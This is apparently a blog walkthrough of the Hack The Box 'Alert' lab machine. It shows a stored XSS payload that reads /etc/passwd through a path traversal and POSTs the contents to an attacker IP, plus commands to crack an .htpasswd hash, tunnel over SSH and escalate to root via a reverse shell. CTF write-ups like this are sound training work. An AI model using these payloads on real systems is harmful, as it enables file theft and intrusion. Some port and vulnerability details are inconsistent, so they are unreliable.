---
title: "Alert Walkthrough(Hack The Box)"
date: 2025-03-22
draft: false 
description: "a description"
tags: ["Easy", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
 
---

## Reconnaissance & Enumeration
- Started with a Nmap scan, revealing open ports: 22, 80.
![Pasted image 20241218005036.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218005036.png?raw=true)
- From the scan results I can also see `12227` port open which is also interesting.
- The scan results showed that Apache2 was hosting the website.
- The website featured a markdown reader page, The Basic functionality of this website is, get's markdown file from the user and then reads the contents of the particular file for displaying it's contents on the website.
- This website also included a share option for the rendered content. Again, it also has a simple `contact form`
- Now it should be obivious that this website uses HTML and JavaScript to render the contents like any other site on the internet
![obivious](https://media1.tenor.com/m/jc-G9cs4QVAAAAAC/station-19-maya-bishop.gif)
- I uploaded a `.md` file with JavaScript snippet init for testing, below were the contents of my md file  
![Pasted image 20241218005523.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218005523.png?raw=true)
- As expected the contents were rendered and loaded like this
![Pasted image 20241218005550.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218005550.png?raw=true)
- This is quite bad. It can execute arbitrary code as it renders the contents

## Exploitation
- Also another functionality in this website is pretty straight forward, where in `contact form` whatever link is filled and sent seems to be clicked by an admin. 
- We can easily get the admin's cookie by making a `.md` file with malicious payload and by sharing the `.md` file link using the share option to the admin through the contact form. The admin will eventually click the link and it will make the code to execute on his browser potentially sending the cookie to us(Attacker). 
- More dangerously we could also read arbitrary files using the `message.php` 
- So to exploit this LFI vulnerability I tried this payload and opened a nc on other side. 


```js
<script>
fetch("http://alert.htb/messages.php?file=/etc/passwd").then(response => response.text())
  .then(data => fetch("http://10.10.14.12:6001", {
      method: "POST",
      body: data
  }));
   
</script>
```
- To trigger this payload, View it and use the share option and get the link, share it to the dumb admin via contact form.
![dumb](https://media1.tenor.com/m/szyfm5XeQmAAAAAC/life.gif)
- After many tries I got this correct I modified the payload accordingly to read the target file 

```js
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../etc/passwd").then(response => response.text())
  .then(data => fetch("http://10.10.14.12:6001", {
      method: "POST",
      body: data
  }));
   
</script>
```
![Pasted image 20241218010840.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218010840.png?raw=true)
- Found couple of users. The configs for apache2 websites generally resides at `/etc/apache2/sites-available/000-default.conf` I learnt this from enumerating my own machine.
![lies-within-you](https://media1.tenor.com/m/fG6zxAnLtWsAAAAC/vegito-db.gif)
![Pasted image 20241218011112.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218011112.png?raw=true)
- After I modified the original payload to read this configuration file and  I got the output.
![Pasted image 20241218011242.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218011242.png?raw=true)
- Got the `.htpasswd` location. Usually this file contains the passwords or hashes for apache2.
- Within that file, password hash for user `albert` was there  
![Pasted image 20241218011625.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218011625.png?raw=true)
- Let's crack the hash I used hashcat to crack this hash 
```bash
hashcat hash.txt  /usr/share/wordlists/rockyou.txt -m 1600 --username
```
- Here I specified module `1600` to crack apache type hash and with as `albert` username is presented with the hash we have to specify `--username` flag
![Pasted image 20241218012743.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218012743.png?raw=true)
- Now I can use ssh to login as user `albert`
- I got the {{< keyword >}} User flag {{< /keyword >}}

{{< alert icon="circle-info" >}} Sorry I accidently nuked the user flag image {{< /alert >}} 
## Privilege Escalation
- General SUID, SGID, Capabilities didn't had anything promising
- But anyway there was a internal web service running on port 80 `ss -tunlp` so I tunneled it to my machine via ssh on port 2000.
```
ssh -L 2000:localhost:8080 albert@alert.Hack The Box
```
![Pasted image 20241218014520.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218014520.png?raw=true)
- The web service name is litterely  `websitemonitor` which tracks and monitor the websites like `alert.htb`
- I found the website's directory location at `/opt/websitemonitor`
- The configuration files for this website are stored within `/config`
![Pasted image 20241218020002.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218020002.png?raw=true)
- The the web root folder of this website has root privileges and Albert also have access to modify it.
- So to escalate my privileges I changed the file to a reverseshell.
![Pasted image 20241218020421.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218020421.png?raw=true)
- Eventually secured {{< keyword >}} Root flag {{< /keyword >}}
![Pasted image 20241218020525.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218020525.png?raw=true)

![summary](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZzgzZzA3MzJyd3M3c3p1NjgzNW53cXZubnA2NW94ZWNncnF6NXQzYSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/j5rIZnN3n3i19hxx8T/giphy.gif)
## Summary

The "Alert" box was approached with an initial **reconnaissance** phase where an nmap scan revealed three open ports: SSH (port 22) and a web server (port 80). The web server was identified as running Apache2 and hosting a Markdown reader page.

During the **enumeration** phase, it was discovered that the Markdown reader could execute code embedded within the Markdown content. Additionally, a contact form was found to be exploitable because the administrator would click on links sent through it without analyzing them, suggesting a potential **Local File Inclusion (LFI)** vulnerability. This LFI was exploited by crafting a payload and sending it to the admin via the contact form. This allowed for the discovery of user information and the location of the Apache2 configuration file, which contained the path to the `.htpasswd` file. The password hash for the user `albert` was found within this file.

The **exploitation** phase also involved cracking `albert`'s password hash using `hashcat`. The cracked password enabled successful SSH login, granting initial user access and the user flag.

For **privilege escalation**, an internal web service named "websitemonitor" was discovered running on port 8080. This port was tunneled to the attacker's machine via SSH. The configuration files for "websitemonitor," including the web root, were located in `/opt/websitemonitor/config`. As the user `albert` and root had permissions to modify files in the web directory,I replaced a file with a reverse shell, leading to root access and the acquisition of the root flag.

{{< typeit >}} This is a small and straightforward walkthrough for the box Alert, I hope you liked this if so kindly check my other posts too. Thank you, see you again {{< /typeit >}}

![bye](https://media.tenor.com/RlCHjOKEpaMAAAAi/rabbit-animal.gif)

